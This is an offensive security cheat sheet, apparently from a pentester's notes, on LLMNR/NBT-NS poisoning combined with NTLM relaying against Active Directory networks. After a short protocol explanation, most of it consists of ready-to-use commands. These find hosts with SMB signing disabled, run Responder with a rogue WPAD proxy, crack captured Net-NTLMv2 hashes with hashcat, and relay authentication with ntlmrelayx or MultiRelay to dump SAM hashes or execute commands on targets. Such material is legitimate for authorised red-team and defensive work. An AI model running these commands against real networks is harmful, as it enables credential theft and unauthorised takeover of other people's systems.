# Active Directory - NTLM Relaying

### Overview

The **LLMNR and NBT-NS poisoning attack**, combined with the **SMB Relay
attack**, or **NTLM Relaying**, can be used to gain an authenticated access to
servers by capturing local network SMB authentication traffic and relaying it to
targets servers.

Even when the organization has good patch management practices, this reliable
and effective attack can almost always be leveraged to obtain an initial
foothold.

###### LLMNR and NBT-NS poisoning

The **Link-Local Multicast Name Resolution (LLMNR)** and **Netbios Name
Service (NBT-NS)** protocols can be abused to intercept local network traffic.

These components allow machines on the same subnet to identify hosts when DNS
resolution fails. If one machine tries to resolve a particular host, but DNS
resolution fails, the machine will then attempt to ask all other machines on
the local network for the correct address via LLMNR or NBT-NS.

An attacker can listen on a network for these LLMNR (UDP/5355) or NBT-NS
(UDP/137) broadcasts requests and respond to them, thus pretending to be the
requested host.

###### NTLM relaying

The **NT LAN Manager v1 and v2** authentication process, used in by the
**Server Message Block (SMB)** protocol can be subverted.

The attack unwinds as follow:
  1. The victim tries to authenticates himself to a server
     (SMB_COM_NEGOTIATE Request)
  2. The authentication request is intercepted by an attacker
  3. The attacker initiates an authentication procedure to a targeted server
     and retrieves an authentication challenge (NTLM_CHALLENGE_MESSAGE) from
     this server
  4. The attacker forwards this challenge to the victim
  5. The victim answers the challenge to the attacker
     (NTLM_AUTHENTICATION_MESSAGE)  
  6. The attacker can then relay the victim challenge response to the targeted
     server to authenticate as the victim
  7. If the victim has local admin rights on the server, an complete access can
     be acquired   

Since MS08-068 you cannot relay a Net-NTLM hash back to the same machine you
got it from (e.g. the 'reflective' attack) unless you're performing a
cross-protocol relay.

For the attack to work, SMB Signing needs to be disabled on the targeted
machine. While SMB packet signing is available in all supported versions of
Windows, it is enabled by default on Domain Controllers.

### Exploit

*
To capture and offline crack the hashes captured, do not disable Responder SMB
and HTTP servers. The authentication attempt won't be transmitted to the relay
servers and no NTLM relaying is possible.  
To crack the Net-NTLMv2 hashes use hashcat:  
hashcat -m 5600 <HASHFILE> <WORDLIST> -o <OUTPUTFILE>
*

First, a list of host with SMB signing must be gathered. Either nmap or
CrackMapExec V4 can be used.

Responder can be used to conduct the LLMNR and NBT-NS poisoning
attack and the ntlmrelayx.py Impacket's or MultiRelay.py, that comes
with the Responder toolkit, scripts can be used for the NTLM relaying.  

##### List SMB Signing disabled hosts

Either nmap or CMEv4 can be used to gather a list of host with SMB signing
disabled and output the result to a file:

```bash
nmap -v -sU -sS --open -oA nmap_smb_signing_off --script smb-security-mode.nse -p U:137,T:139,445 <TARGETS>
cat nmap_smb_signing_off.nmap | grep -B 14 "message_signing: disabled" | grep "Nmap scan report for" | cut -d " " -f 5 > <FILE>

cme smb <TARGETS> --gen-relay-list <FILE>
```

##### Intercepting

To check if a specific host, identified by its hostname, has LLMNR activated:

```
nmap --script llmnr-resolve --script-args 'llmnr-resolve.hostname=<HOSTNAME>'
nmap --script llmnr-resolve --script-args 'llmnr-resolve.hostname=<HOSTNAME>' -e <NETWORK_INTERFACE>

# Metasploit
use auxiliary/scanner/llmnr/query
set NAME <HOSTNAME>
run
```

If LLMNR is disabled, system have been hardened but NBT-NS may still be enabled.

Responder can be used to conduct the LLMNR and NBT-NS poisoning
attack.

*Do not use the version of Responder on SpiderLab's Github repository as it
isn't maintained anymore, use lgandx's fork instead.*

Edit the Responder.conf file and turn off the SMB and HTTP servers:

```
[Responder Core]

; Servers to start
SQL = On
SMB = Off     # Turn this off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off    # Turn this off
HTTPS = On
DNS = On
LDAP = On
```

With those servers turned off, the authentication attempts captured are
automatically passed to ntlmrelayx.py's SMB and HTTP servers for the relay
attack.

Start Responder :

```
# -r : Enable answers for netbios wredir suffix queries
# -d : Enable answers for netbios domain suffix queries
# -w :  Start the WPAD rogue proxy server

python Responder.py -I <NETWORK_INTERFACE> -r -d -w
```

##### Relaying

The ntlmrelayx.py Impacket's or MultiRelay.py, that comes
with the Responder toolkit, scripts can be used for the NTLM relaying part:  

```
# ntlmrelayx - By default, dump SAM base.
ntlmrelayx.py -tf <TARGETS_FILE>
ntlmrelayx.py -tf targets.txt -c <COMMAND>

# MultiRelay
MultiRelay.py -t <target host> -c <'command to run'> -u <user to target>
```
